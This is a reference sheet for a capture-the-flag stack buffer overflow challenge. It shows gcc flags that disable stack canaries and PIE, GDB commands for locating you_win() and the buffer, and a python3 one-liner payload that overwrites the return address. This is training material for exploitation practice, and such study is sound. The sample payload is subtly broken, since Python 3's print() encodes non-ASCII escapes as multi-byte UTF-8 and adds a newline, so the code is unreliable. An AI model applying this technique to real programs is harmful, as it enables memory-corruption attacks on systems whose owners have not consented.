# Summary: Essential Commands for the Overflow Challenge

This is a reference guide for compiling, debugging, and exploiting the `unlock_flag` challenge.

---

## Compilation

```bash
gcc -g -fno-stack-protector -z execstack -no-pie unlock_flag.c -o unlock_flag
```

| Option | Purpose |
|--------|---------|
| `-g` | Include debug symbols for GDB |
| `-fno-stack-protector` | Disable stack canary (overflow protection) |
| `-z execstack` | Allow execution from the stack (not required here but included for completeness) |
| `-no-pie` | Disable address randomization (fixed function addresses) |
| `-o unlock_flag` | Output executable file name |

---

## Debugging with GDB

```bash
gdb ./unlock_flag
```

### Inside GDB:

| Command | Description |
|---------|-------------|
| `break vuln` | Set a breakpoint at the start of `vuln()` |
| `run` | Start the program and stop at the breakpoint |
| `print you_win` | Print the address of the function `you_win()` |
| `info frame` | Show stack frame info (including return address location) |
| `print &name` | Show buffer start address |
| `x/20xb $rsp` | Examine 20 bytes at stack pointer |
| `quit` | Exit GDB |

---

## Running the Exploit Payload

Construct an input that:
- Overflows the buffer (32 bytes total: 24 buffer + 8 saved RBP)
- Overwrites the return address with the address of `you_win()` (in little endian)

Example:

```bash
python3 -c "print('A'*32 + '\x86\x11\x40\x00\x00\x00\x00\x00')" | ./unlock_flag
```

Replace `\x86\x11\x40...` with the address you find using GDB.

---

## Little Endian Reminder

To convert a 64-bit address (e.g. `0x401186`) into little endian:

```
0x401186  →  \x86\x11\x40\x00\x00\x00\x00\x00
```

The least significant byte comes first.

---

Good luck, and remember: precision matters in memory!

